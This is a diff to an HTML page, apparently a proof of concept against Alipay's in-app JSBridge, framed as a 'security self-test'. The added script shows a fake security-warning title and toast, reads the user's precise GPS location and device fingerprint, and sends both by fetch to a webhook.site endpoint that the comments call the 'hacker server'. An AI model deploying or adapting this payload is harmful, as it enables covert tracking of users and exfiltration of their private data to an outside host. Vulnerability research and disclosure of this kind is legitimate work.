@@ -3,53 +3,69 @@
 <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>我的支付宝安全自测</title>
+    <title>支付宝安全自测 - 闭环版</title>
     <style>
-        body { font-family: sans-serif; padding: 20px; line-height: 1.6; }
-        .card { border: 1px solid #ccc; padding: 15px; border-radius: 8px; margin-bottom: 10px; background: #f9f9f9; }
-        .b { font-weight: bold; color: #1677ff; }
+        body { font-family: sans-serif; padding: 20px; line-height: 1.6; color: #333; }
+        .card { border: 1px solid #ddd; padding: 15px; border-radius: 12px; margin-bottom: 15px; background: #fff; box-shadow: 0 2px 5px rgba(0,0,0,0.05); }
+        .b { font-weight: bold; color: #1677ff; display: block; margin-bottom: 5px; }
+        pre { background: #eee; padding: 10px; border-radius: 5px; overflow-x: auto; font-size: 12px; }
+        #status-msg { color: #52c41a; font-weight: bold; }
     </style>
 </head>
 <body>
-    <h2>🔍 支付宝隐私权限读取测试</h2>
-    <p>如果看到以下信息，说明 JSBridge 已被成功调取：</p>
+    <h2>🚀 数据外泄实测</h2>
+    <div id="status-msg">正在初始化安全环境...</div>
 
     <div class="card">
-        <div class="b">1. UI 篡改状态：</div>
-        <div id="ui-status">等待改名...</div>
+        <span class="b">1. 位置信息 (已发送至服务器)</span>
+        <div id="gps-info">等待读取...</div>
     </div>
 
     <div class="card">
-        <div class="b">2. 我的精确位置：</div>
-        <div id="gps-info">正在定位...</div>
-    </div>
-
-    <div class="card">
-        <div class="b">3. 手机硬件指纹：</div>
-        <pre id="device-info">正在读取设备参数...</pre>
+        <span class="b">2. 硬件指纹 (已发送至服务器)</span>
+        <pre id="device-info">等待读取...</pre>
     </div>
 
     <script>
-    document.addEventListener('AlipayJSBridgeReady', function () {
-        // A. 篡改标题
-        AlipayJSBridge.call('setTitle', { title: '⚠️ 你的信息已外泄' });
-        document.getElementById('ui-status').innerText = "标题已被修改为：'你的信息已外泄'";
+    // 【关键】请把下面这个地址换成你在 Webhook.site 拿到的那个链接！
+    const webhookUrl = "https://webhook.site/你的专属ID"; 
 
-        // B. 获取 GPS
-        AlipayJSBridge.call('getLocation', function(result) {
-            if (result.error) {
-                document.getElementById('gps-info').innerText = "定位失败（可能未授权）";
-            } else {
-                document.getElementById('gps-info').innerHTML = 
-                    "纬度: " + result.latitude + "<br>经度: " + result.longitude + 
-                    "<br>城市: " + (result.city || "未知");
-            }
+    document.addEventListener('AlipayJSBridgeReady', function () {
+        const status = document.getElementById('status-msg');
+        
+        // --- 1. 原生弹窗：证明我拿到了“控制权” ---
+        AlipayJSBridge.call('toast', {
+            content: '⚠️ 漏洞复现成功：正在外传隐私数据',
+            type: 'none',
+            duration: 3000
         });
 
-        // C. 获取设备信息
+        // --- 2. 篡改标题 ---
+        AlipayJSBridge.call('setTitle', { title: '您的账户存在安全隐患' });
+        status.innerText = "状态：数据抓取中...";
+
+        // --- 3. 获取并外传 GPS ---
+        AlipayJSBridge.call('getLocation', function(result) {
+            let gpsData = result.error ? "获取失败" : `纬度:${result.latitude}, 经度:${result.longitude}`;
+            document.getElementById('gps-info').innerText = gpsData;
+
+            // 发送到黑客服务器
+            fetch(webhookUrl + "?type=gps&data=" + encodeURIComponent(JSON.stringify(result)));
+        });
+
+        // --- 4. 获取并外传设备指纹 ---
         AlipayJSBridge.call('getSystemInfo', function(result) {
             document.getElementById('device-info').innerText = JSON.stringify(result, null, 2);
+            
+            // 发送到黑客服务器
+            fetch(webhookUrl, {
+                method: 'POST',
+                body: JSON.stringify({ type: 'device_info', payload: result })
+            });
+
+            status.innerText = "状态：所有数据已成功外传！";
         });
+
     }, false);
     </script>
 </body>
